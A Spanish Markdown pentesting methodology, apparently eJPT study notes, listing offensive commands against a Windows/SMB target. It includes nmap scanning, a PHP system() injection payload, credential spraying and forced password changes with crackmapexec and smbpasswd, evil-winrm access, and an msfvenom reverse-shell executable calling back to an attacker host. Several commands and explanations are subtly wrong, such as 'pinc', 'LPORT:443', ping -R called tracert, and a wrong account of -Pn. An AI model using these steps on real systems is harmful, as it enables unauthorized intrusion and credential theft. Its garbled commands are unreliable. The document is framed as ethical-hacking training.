# ***Pentesting: Methodology***

`Pentesting Methodology` este documento sirve para tener una metodología a la hora de hacer pentesting en empresas. Donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.

> [!NOTE]
> Las direcciones IP o segmento que le corresponde al atacanque y a la victima son las siguiente:
> - VICTIMA = $${\color{red}192.168.0.0/24}$$	
> - ATACANTE = $${\color{lightgreen}192.168.10.0/24}$$	


## <ins>Fase 1: Enumeración</ins> (escaneo) 

#### 1.1. Verificar si está encendido.      
   ```bash
   pinc -c 1 192.168.0.10
   ```

#### 1.2. Tracert para ver porque nodos pasan, si el TTL es 64 corresponde a un Linux y si es 128 a Windows.      
   ```bash
   pinc -c 1 192.168.0.10 -R
   ```

#### 1.3. Escaneo de puertos TCP abiertos.      
   ```bash
   nmap -p- --open -T5 -v -n 192.168.0.10 -oG allPorts
   ```
  - _El parametro **T5** es temporizador de escaneo, mientras mas alto va mas rápido, **T0** es mas lento y **T5** es el tope, además es muy ruidoso no recomendado en escaneos reales ni en el excamen de  eJPT._
    
#### 1.4. Escaneo muy rapido (NO recomendado en pentesting reales).      
   ```bash
   nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 192.168.0.10 -oG allPorts
   ```
 - _El parametro **-sS** es tcp sync port scan, el parametro **--min--rate** controla el número de paquetes que se quiere enviar 5 mil x segundo, el parametro **-Pn** es para evitar descubrimientode host mediante resolución de nombres del protocolo ARP._

#### 1.5. Escaneo exhaustivo de puertos.      
   ```bash
   nmap -sC -sV -p22,80 192.168.0.10 -oN targeted
   ```




## <ins>Fase 2: Análisis de Vulnerabilidades</ins> 

### 2.1. Puerto 80 - HTTP

#### 2.1.1 Identificar el gestor de contenido web.      
   ```bash
   whatweb http://192.168.0.10
   ```
> [!TIP]
> También se puede identificar la tecnología web utilizando la extensión en Mozilla lamado: $${\color{lightgreen}Wappanalyzer}$$.
> https://addons.mozilla.org/es/firefox/addon/wappalyzer/

#### 2.1.2 Si existe un servidor web, aplicar fuerza bruta de directorio con nmap (por ejemplo, /admin, /login, /phpmyadmin, etc.).      
   ```bash
   nmap --script http-enum -p80 192.168.0.10 -oN webScan 
   ```

#### 2.1.3. Si existe una web en PHP, inyectar código en las entradas de usuario.      
   ```bash
   <?php system("whoami"); ?> 
   ```
-------------------------------------------------------------------------------------------------
### 2.2. Puerto 445 - SMB

#### 2.2.1. Es un servidor de dominio SMB, podemos identificar el sistema operativo, la versión en uso o su tipo de arquitectura.      
   ```bash
   crackmapexec smb 192.168.0.10
   ```

#### 2.2.2. Si se dectectó un nombre de dominio, agregarlo el nombre de dominio y la IP de la victima en $${\color{lightblue}/etc/hosts}$$      
   ```bash
   192.168.0.10     dominio.local
   ```

#### 2.2.3. Listar los recuros compartidos a nivel de red.      
   ```bash
   smbclient -L 192.168.0.10 -N
   ```

#### 2.2.4. Si el puerto 135 esta abierto, podemos probar con RPC client ya que es un controlador de dominio.      
   ```bash
   rpcclient -U "" 192.168.0.10 -N 
   rpcclient $> enumdomusers 
   result was NT_STATUS_ACCESS_DENIED  
   ```
   - _Si la respuesta de rpcclient es **ACEES_DENIED** significa que no se puede enumerar_

#### 2.2.5. Del sitio web podemos identificar algunos nombres de usuarios para reallizar fuerza bruta. Lo guardamos en un archivo llamado **users**.  
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p users --continue-on-success | grep -v -i "failure"  
   ```
   - _Las contraseñas serán las mismas que los nombres de usuarios._

#### 2.2.6. Generar diccionario de contraseñas con la información del sitio web de forma automática y lo guardamos en un fichero llamado **passwords**.  
   ```bash
   cewl -w passwords http://domail.local/..../ --with-numbers   
   ```

   - _Ahora usamos ese fichero._
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p passwords --continue-on-success | grep -v -i "failure"

   SMB     192.168.0.10     445     FUSE    [-] domain.local\nombre_usuario:contraseña STATUS_PASSWORD_MUST_CHANGE 
   ```

  - _Si nos aparece el mensaje **STATUS_PASSWORD_MUST_CHANGE** significa que la contraseña es válida y podemos cambiar la contraseña._
   ```bash
   smbpasswd -r 192.168.0.10 -U "nombre_usuario" 

Old SMB password: contraseña
   ```

#### 2.2.7. Probar nuevamente enumerar recursos compartidos con fuerza bruta.  
   ```bash
   crackmapexec smb 192.168.0.10 -u "nombre_usuario" -p "contraseña_nueva"  
   ```

#### 2.2.8. Ahora como ya se tiene contraseñas validas se puede hacer rpcclient.  
   ```bash
   rpcclient -U 'nombre_usuario%contraseña_nueva' 192.168.0.10 

rpcclient $> enumdomusers 
rpcclient $> enumprinters    
   ```

#### 2.2.9. Probar acceso sobre la administración remota de Windows.  
   ```bash
   crackmapexec winrm 192.168.0.10 -u 'nombre_usuario' -p 'contraseña' 

WINRM    192.168.0.10     5985     FUSE    [-] domain.local\nombre_usuario:contraseña (Pwn3d!)     
   ```

#### 2.2.11. Si en la respuesta nos aparece **Pwned** significa que tenemos privilegios.  Teniendo acceso remoto vemos si podemos acceder al directorio del administrador. 
   ```bash
   evil-winrm -i 192.168.0.10 -u 'nombre_usuario' -p 'contraseña'

    *Evil-WinRM* PS C:\Users\nombre_usuario\Desktop> cd C:\Users\Administrator
   ```
   - _Si no se puede acceder al directorio del administrador intentar a directorio temporal: **cd C:\Windows\Temp**_
   ```bash
   *Evil-WinRM* PS C:\Windows\Temp> whoami /priv
   ```
   - _Con **whoami /priv** enumeramos los privilegios del usuario con el que tenemos la contraseña. Si queremos ver mas información usar el comando **whoami /all**._

#### 2.2.12. Compartir archivos de Windows a Linux en cmd
   - _En Windows escribir el primer comando y en linux el segundo comando._
   ```bash
     python -m http.server 
   ```
   ```bash
     wget http://192.168.0.10:8000/nombre_archivo 
   ```



## <ins>Fase 3: Explotación</ins> 

#### 3.1 Crear una revershell.      
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.1 LPORT:443 -f exe -o reverse.exe
   ```

























> [!Warning]
> 
> ### DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.







> [!IMPORTANT]
> Crucial information necessary for users to succeed.

> [!CAUTION]
> Negative potential consequences of an action.



